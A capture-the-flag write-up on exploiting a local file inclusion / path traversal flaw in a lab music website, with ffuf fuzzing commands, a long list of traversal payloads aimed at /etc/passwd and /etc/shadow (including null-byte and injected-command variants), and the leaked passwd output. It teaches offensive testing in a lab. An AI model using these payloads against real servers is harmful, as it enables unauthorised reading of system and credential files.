# Lo-Fi 🎵 — Writeup

---

## 🔍 Enumeration

When we opened the URL `http://10.48.136.217/` in the browser, it displayed a homepage listing lo-fi songs.

Here is the source code:

```html
<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
        integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">

    <style>
        body {
            padding-top: 56px;
            padding-bottom: 56px;
            min-height: 100vh;
            position: relative;
        }
        .footer {
            bottom: 0;
            width: 100%;
            position: absolute;
            height: 56px;
        }
    </style>

    <title>Lo-Fi Music</title>
</head>

<body>

    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
        <div class="container">
            <a class="navbar-brand" href="/">Lo-Fi Music</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive"
                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarResponsive">
            </div>
        </div>
    </nav>

        <!-- Page Content -->
    <div class="container">

        <div class="row">

            <!-- Blog Entries Column -->
            <div class="col-md-8">

                <h1 class="my-4">Cool beats to listen to</h1>

                <!-- Blog Post -->
                <div class="card mb-4">
                    <div class="card-body">

                        <h2 class="card-title">Relax</h2>

<p class="card-text">
    <iframe width="680" height="360" src="https://www.youtube.com/embed/5qap5aO4i9A" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
</p>                    </div>
                </div>

            </div>

            <!-- Sidebar Widgets Column -->
            <div class="col-md-4">

                <!-- Search Widget -->
                <div class="card my-4">
                    <h5 class="card-header">Search</h5>
                    <div class="card-body">
                        <form action="/" method="get">
                            <div class="input-group">
                                <input type="text" class="form-control" name="search" placeholder="Search for...">
                                <span class="input-group-btn">
                                    <button class="btn btn-secondary" type="submit">Go!</button>
                                </span>
                            </div>
                        </form>
                    </div>
                </div>

                <!-- Categories Widget -->
                <div class="card my-4">
                    <h5 class="card-header">Discography</h5>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-lg-6">
                                <ul class="list-unstyled mb-0">
                                    <li><a href="/?page=relax.php">Relax</a></li>
                                    <li><a href="/?page=sleep.php">Sleep</a></li>
                                    <li><a href="/?page=chill.php">Chill</a></li>
                                    <li><a href="/?page=coffee.php">Coffee</a></li>
                                    <li><a href="/?page=vibe.php">Vibe</a></li>
                                    <li><a href="/?page=game.php">Game</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
        <!-- /.row -->
    </div>
    <!-- /.container -->

    <!-- Footer -->
    <footer class="py-3 bg-dark footer">
        <div class="container">
                &nbsp;
        </div>
        <!-- /.container -->
    </footer>

</body>

</html>
```

As we can see, the source code doesn't give any clue about the flag.

So we proceeded to directory enumeration, which gave us:

```text
[23:34:48] 403 -  244B  - /.ht_wsr.txt
[23:34:48] 403 -  242B  - /.htaccess.bak1
[23:34:48] 403 -  243B  - /.htaccess.sample
[23:34:48] 403 -  242B  - /.htaccess.orig
[23:34:48] 403 -  242B  - /.htaccessBAK
[23:34:48] 403 -  244B  - /.htaccess_extra
[23:34:48] 403 -  241B  - /.htaccessOLD
[23:34:48] 403 -  243B  - /.htaccess_orig
[23:34:48] 403 -  241B  - /.htaccess.save
[23:34:48] 403 -  242B  - /.htaccess_sc
[23:34:48] 403 -  242B  - /.htaccessOLD2
[23:34:48] 403 -  237B  - /.htm
[23:34:48] 403 -  238B  - /.html
[23:34:48] 403 -  246B  - /.htpasswd_test
[23:34:48] 403 -  241B  - /.httr-oauth
[23:34:48] 403 -  241B  - /.htpasswds
[23:35:44] 403 -  241B  - /server-status/
[23:35:44] 403 -  240B  - /server-status
```

But this also didn't give us any interesting endpoint for further enumeration.

---

## 🕵️ Finding the Vulnerability

In the homepage, under the **Discography** section, clicking on **Relax** changed the URL to `http://10.48.136.217/?page=relax.php`.

This means we can fuzz the `?page=` parameter for different values.

![fuzz_res](fuzz_res.png)

As we can see, only 2 endpoints are listed.

So we started manually testing different values for `page=`.

After many tries, when we set `page=/home`, it showed something interesting:

![hackerr_spot](hackerr_spot.png)

After some testing, we understood that no matter what comes after `/`, it always prints:

> *HACKKERRR!! HACKER DETECTED. STOP HACKING YOU STINKIN HACKER!*

Now we know it reacts to certain payloads — this room is about **LFI (Local File Inclusion) / Path Traversal**. 🔓

---

## 💣 Exploitation

We need to fuzz with a wordlist specifically focused on LFI and path traversal. Since the web server is Apache:

```
Not Found
The requested URL /fas was not found on this server.

Apache/2.2.22 (Ubuntu) Server at 10.48.161.15 Port 80
```

We tried the Apache-specific wordlist first — the wordlist at `/home/Seclists/Discovery/Web-Content/Web-Servers/Apache.txt` — with the command:

```
ffuf -u http://10.48.161.15/?page=FUZZ -w /home/Seclists/Discovery/Web-Content/Web-Servers/Apache.txt -fw 1367,1369
```

This didn't give us a valid endpoint either.

So we searched inside SecLists and found there are specifically many files for LFI under `/Seclists/fuzzing/lfi/`:

```
LFI-etc-files-of-all-linux-packages.txt
LFI-gracefulsecurity-linux.txt
LFI-gracefulsecurity-windows.txt
LFI-Jhaddix.txt
LFI-LFISuite-pathtotest-huge.txt
LFI-LFISuite-pathtotest.txt
LFI-linux-and-windows_by-1N3@CrowdShield.txt
LFI-Windows-adeadfed.txt
OMI-Agent-Linux.txt
```

We specifically used `LFI-Jhaddix.txt` with the command:

```
ffuf -u http://10.48.161.15/?page=FUZZ -w /home/Seclists/fuzzing/lfi/LFI-Jhaddix.txt -fw 1367,1369
```

This returned several endpoints:

```
%0a/bin/cat%20/etc/passwd [Status: 200, Size: 3987, Words: 1368, Lines: 125, Duration: 79ms]
%0a/bin/cat%20/etc/shadow [Status: 200, Size: 3987, Words: 1368, Lines: 125, Duration: 89ms]
../../../../../../../dev [Status: 200, Size: 3877, Words: 1358, Lines: 124, Duration: 78ms]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 4051, Words: 1360, Lines: 131, Duration: 81ms]
../../../../../../../../../../../../etc/hosts%00 [Status: 200, Size: 4051, Words: 1360, Lines: 131, Duration: 79ms]
../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 67ms]
../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 73ms]
../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 77ms]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 77ms]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 79ms]
../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 80ms]
../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 78ms]
../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 75ms]
../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 75ms]
../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 64ms]
../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 66ms]
../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 77ms]
../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 71ms]
../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 71ms]
../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 66ms]
../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 73ms]
../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 74ms]
../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 74ms]
../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 78ms]
../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 85ms]
../../../../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 66ms]
../../../../../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 68ms]
../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 85ms]
../../../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 79ms]
../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 80ms]
../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 88ms]
../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 86ms]
../../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 88ms]
../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 79ms]
../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 80ms]
../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 74ms]
../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 78ms]
../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 79ms]
../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 80ms]
../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 80ms]
../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 73ms]
../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 73ms]
../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 82ms]
../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 81ms]
../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 81ms]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 86ms]
../../../../../../../../../../../../etc/shadow [Status: 200, Size: 3877, Words: 1358, Lines: 124, Duration: 70ms]
../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00 [Status: 200, Size: 3877, Words: 1358, Lines: 124, Duration: 72ms]
../../../../../../../../../../../../etc/shadow%00 [Status: 200, Size: 3877, Words: 1358, Lines: 124, Duration: 75ms]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow [Status: 200, Size: 3877, Words: 1358, Lines: 124, Duration: 2813ms]
..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow [Status: 200, Size: 3877, Words: 1358, Lines: 124, Duration: 3488ms]
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 3492ms]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 3501ms]
:: Progress: [930/930] :: Job [1/1] :: 117 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

---

## 🚩 Getting the Flag

Let's hit the first valid endpoint:

`http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd`

And we got:

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh
```

The endpoint `http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd` is successfully leaking the contents of `/etc/passwd`.

By modifying the URL to `http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fflag.txt`, we get the flag! 🎉
